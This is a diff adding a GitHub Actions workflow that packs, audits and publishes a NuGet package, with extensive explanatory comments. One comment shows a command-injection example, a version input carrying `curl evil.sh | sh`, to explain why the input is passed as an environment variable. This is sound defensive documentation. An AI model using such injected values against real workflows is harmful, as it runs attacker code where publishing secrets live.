@@ -1,0 +1,284 @@
+name: pack
+
+# Pack Febris.XApi.Models and push it to nuget.org, versioned from the tag that triggered the run.
+#
+# THIS IS THE FIRST PACKAGE THE PLATFORM PUBLISHES. The node's AGPL triad, the mobile suite, the PC
+# client and the simulation SDK all restore from it. A push to nuget.org cannot be undone: a bad
+# version can be unlisted but never deleted, and the number is burned forever.
+#
+#
+# == WHY THIS REPOSITORY PUBLISHES ITS OWN PACKAGE ==================================================
+#
+# The node repository has a publish-triad.yml that packs three AGPL packages. It must NOT publish
+# this one. Its own documentation offers that as a remedy for an ordering problem and describes the
+# consequence accurately: it would mean "publish that contract under this repository's licence",
+# i.e. AGPL-3.0. This package is Apache-2.0 on purpose, because a shared data contract that others
+# may only use under copyleft is not a shared contract. Publishing it from the node would relicense
+# the keystone. Hence a separate workflow, in the repository that actually owns the code.
+#
+#
+# == WHAT THIS DOES THAT THE NODE'S WORKFLOW DOES NOT ==============================================
+#
+# The node's publish-triad.yml was reviewed before this file was written, and three gaps found there
+# are closed here:
+#
+#   1. It checks dependency IDs but never dependency VERSIONS, so a package pinned to a sibling
+#      version that does not exist passes the gate and publishes permanently. This audit checks both.
+#   2. Nothing rejects a non-public host in <repository url>. Measured: packing this project in the
+#      private workshop stamps that workshop's own git origin into the nuspec, because
+#      PublishRepositoryUrl tells SourceLink to record the origin. That origin is an internal host
+#      carrying a personal handle. This audit requires the url to be this GitHub repository.
+#   3. Its actions float on @v4 tags. These are pinned to full commit SHAs, so a retagged action
+#      cannot execute in the job that holds the nuget.org key.
+#
+# It also adds a dry run, because an audit designed to refuse is impossible to iterate on when the
+# only way to invoke it is to burn a real tag.
+
+on:
+  push:
+    tags:
+      - 'v*'
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Version to pack, without the leading v (e.g. 0.1.0)'
+        required: true
+      dry_run:
+        description: 'Pack and audit, but do not push to nuget.org'
+        type: boolean
+        default: true
+
+permissions:
+  contents: read
+
+concurrency:
+  # Never cancel a publish in flight. A cancelled push can leave some packages indexed and others
+  # not, and the fix for that is a new version number, not a re-run.
+  group: pack-${{ github.ref }}
+  cancel-in-progress: false
+
+env:
+  DOTNET_NOLOGO: 'true'
+  DOTNET_CLI_TELEMETRY_OPTOUT: 'true'
+  DOTNET_SKIP_FIRST_TIME_EXPERIENCE: 'true'
+  NUGET_SOURCE: 'https://api.nuget.org/v3/index.json'
+  PACKAGE_ID: 'Febris.XApi.Models'
+  PROJECT: 'shared/FebrisXApiModels/Febris.XApi.Models.csproj'
+
+jobs:
+  # Everything reversible happens here. The publish job needs this one, so a tag on a commit that
+  # does not build cannot reach nuget.org. There is no test project in this repository and none is
+  # withheld: the types are data carriers with no behaviour to assert, and CONTRIBUTING.md explains
+  # that. A green build is therefore the honest gate, not a stand-in for a test suite that exists.
+  verify:
+    name: build
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+
+      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
+        with:
+          # global-json-file, not dotnet-version. setup-dotnet does not SELECT an SDK, it installs
+          # one, and with no global.json the CLI takes the highest installed. Pointing it at the
+          # committed global.json means the SDK that gets installed and the SDK that gets used are
+          # the same by construction rather than by coincidence.
+          global-json-file: global.json
+
+      - name: Show the toolchain actually in use
+        run: dotnet --version && dotnet --list-sdks
+
+      - run: dotnet restore "$PROJECT"
+      - run: dotnet build "$PROJECT" -c Release --no-restore
+
+  publish:
+    name: pack + push
+    needs: verify
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    # Add a required reviewer to this environment in repository settings to make the push a
+    # human-approved step. GitHub creates the environment on first use with no protection rules, so
+    # declaring it here is safe but is NOT protection by itself until a rule is added.
+    environment: nuget-release
+
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+
+      - uses: actions/setup-dotnet@a98b56852c35b8e3190ac28c8c2271da59106c68 # v6.0.0
+        with:
+          global-json-file: global.json
+
+      - name: Resolve the version
+        id: version
+        shell: bash
+        # The dispatch input arrives through the ENVIRONMENT, never through ${{ }} interpolation into
+        # the script body. A ${{ }} expression is pasted in as literal text before bash starts, so an
+        # input of `0.1.0"; curl evil.sh | sh; "` would execute at that moment -- before the regex
+        # below ever sees it. Validation cannot protect a string that has already been substituted
+        # into the program. As an env var the value is data, and the regex is then meaningful.
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          VERSION_INPUT: ${{ inputs.version }}
+        run: |
+          set -euo pipefail
+          if [ "$EVENT_NAME" = "workflow_dispatch" ]; then
+            VERSION="$VERSION_INPUT"
+          else
+            VERSION="${GITHUB_REF_NAME#v}"
+          fi
+          if ! [[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$ ]]; then
+            echo "::error::'$VERSION' is not a NuGet version. Expected MAJOR.MINOR.PATCH[-prerelease]."
+            exit 1
+          fi
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
+          echo "Packing $VERSION"
+
+      - name: Pack
+        shell: bash
+        env:
+          VERSION: ${{ steps.version.outputs.version }}
+        run: |
+          set -euo pipefail
+          dotnet pack "$PROJECT" -c Release \
+            -p:Version="$VERSION" \
+            -p:ContinuousIntegrationBuild=true \
+            -o artifacts
+          ls -l artifacts
+
+      # THE GATE. Everything above is local and reversible. Everything below is permanent.
+      - name: Audit the packed nuspec
+        shell: bash
+        env:
+          VERSION: ${{ steps.version.outputs.version }}
+        run: |
+          python3 - <<'PY'
+          import os, sys, glob, zipfile
+          import xml.etree.ElementTree as ET
+
+          version = os.environ["VERSION"]
+          expected_id = os.environ["PACKAGE_ID"]
+
+          # A POSITIVE assertion, not a deny-list. An earlier draft named the workshop's own hosts
+          # and handles here, which had two faults. A deny-list only catches the hosts somebody
+          # remembered, and publishing that list in a public workflow discloses the very identifiers
+          # it exists to keep out. This package publishes from GitHub Actions in its public
+          # repository, so that repository is the only acceptable origin.
+          REQUIRED_URL_PREFIX = "https://github.com/"
+
+          problems, found = [], set()
+          packages = sorted(glob.glob("artifacts/*.nupkg"))
+          symbols = sorted(glob.glob("artifacts/*.snupkg"))
+
+          if not packages:
+              print("audit FAILED: no .nupkg was produced")
+              sys.exit(1)
+
+          for path in packages:
+              zf = zipfile.ZipFile(path)
+              root = ET.fromstring(zf.read(next(n for n in zf.namelist() if n.endswith(".nuspec"))))
+              ns = root.tag.split("}")[0].strip("{")
+              md = root.find("{%s}metadata" % ns)
+
+              def text(tag):
+                  el = md.find("{%s}%s" % (ns, tag))
+                  return (el.text or "").strip() if el is not None else ""
+
+              pid = text("id")
+              found.add(pid)
+              def bad(msg, _pid=pid, _path=path):
+                  problems.append("%s: %s" % (_pid or _path, msg))
+
+              if pid != expected_id:
+                  bad("unexpected package id; this repository publishes only %s" % expected_id)
+              if text("version") != version:
+                  bad("<version> is %r but the run says %r" % (text("version"), version))
+
+              authors = text("authors")
+              if not authors or authors == pid:
+                  bad("<authors> is %r, the dotnet pack default. Set <Authors> in the csproj." % authors)
+
+              desc = text("description")
+              if not desc or desc == "Package Description":
+                  bad("<description> is %r, the dotnet pack default." % desc)
+
+              lic = md.find("{%s}license" % ns)
+              if lic is None or lic.get("type") != "expression" or not (lic.text or "").strip():
+                  bad('no <license type="expression">.')
+              elif (lic.text or "").strip() != "Apache-2.0":
+                  # Loud on purpose. This package is the shared contract every tier consumes, and
+                  # shipping it under the platform's AGPL would relicense it for every consumer.
+                  bad("<license> is %r, expected Apache-2.0. THIS IS A RELICENSING BUG."
+                      % (lic.text or "").strip())
+
+              repo = md.find("{%s}repository" % ns)
+              url = (repo.get("url") if repo is not None else "") or ""
+              if not url:
+                  bad("<repository> carries no url. PublishRepositoryUrl needs a git origin; "
+                      "this normally means the checkout had no remote.")
+              else:
+                  low = url.lower()
+                  if "<org>" in low:
+                      bad("<repository url> still contains the <org> placeholder: %s" % url)
+                  elif not low.startswith(REQUIRED_URL_PREFIX):
+                      bad("<repository url> is %s, which is not a %s url. A workshop checkout "
+                          "stamps its own origin, so this means the package was not built in CI. "
+                          "Pack from CI." % (url, REQUIRED_URL_PREFIX))
+
+              for dep in md.iter("{%s}dependency" % ns):
+                  did = dep.get("id", "")
+                  dver = (dep.get("version") or "").strip()
+                  if did.startswith("Febris."):
+                      # The keystone is a leaf by design and the whole publish order depends on it.
+                      bad("depends on %s %s. This package is published FIRST, so any Febris "
+                          "dependency is unresolvable on nuget.org by definition." % (did, dver))
+                  elif not dver:
+                      bad("dependency %s carries no version constraint" % did)
+
+          print("packages: %s" % ", ".join(packages))
+          print("symbols:  %s" % (", ".join(symbols) if symbols else "none"))
+
+          if problems:
+              print("\nnuspec audit FAILED. Nothing has been pushed to nuget.org.\n")
+              for p in problems:
+                  print("  - %s" % p)
+              sys.exit(1)
+
+          print("\nnuspec audit passed: %s %s" % (", ".join(sorted(found)), version))
+          PY
+
+      # Kept even when the audit fails: reading the nuspec of the rejected artifact is the fastest
+      # way to see why.
+      - name: Upload the packages
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: ${{ env.PACKAGE_ID }}-${{ steps.version.outputs.version }}
+          path: artifacts/*.*nupkg
+          if-no-files-found: warn
+
+      - name: Push to nuget.org
+        if: ${{ github.event_name == 'push' || !inputs.dry_run }}
+        shell: bash
+        env:
+          VERSION: ${{ steps.version.outputs.version }}
+          NUGET_API_KEY: ${{ secrets.NUGET_API_KEY }}
+        run: |
+          set -euo pipefail
+          if [ -z "${NUGET_API_KEY}" ]; then
+            echo "::error::secrets.NUGET_API_KEY is not set on this repository or its environment."
+            exit 1
+          fi
+          # --skip-duplicate makes a re-run after a partial failure idempotent rather than failing on
+          # a version that already landed. dotnet nuget push also uploads the adjacent .snupkg.
+          dotnet nuget push "artifacts/${PACKAGE_ID}.${VERSION}.nupkg" \
+            --source "$NUGET_SOURCE" \
+            --api-key "$NUGET_API_KEY" \
+            --skip-duplicate
+
+      - name: Dry run summary
+        if: ${{ github.event_name == 'workflow_dispatch' && inputs.dry_run }}
+        # Block scalar, not a plain one. `run: echo "a: b"` does NOT parse: the value starts
+        # at `echo`, so it is a PLAIN scalar and the `: ` inside it ends the scalar and starts a
+        # mapping. The surrounding quotes are just characters and protect nothing.
+        run: |
+          echo "Dry run: the package was built and audited but NOT pushed."
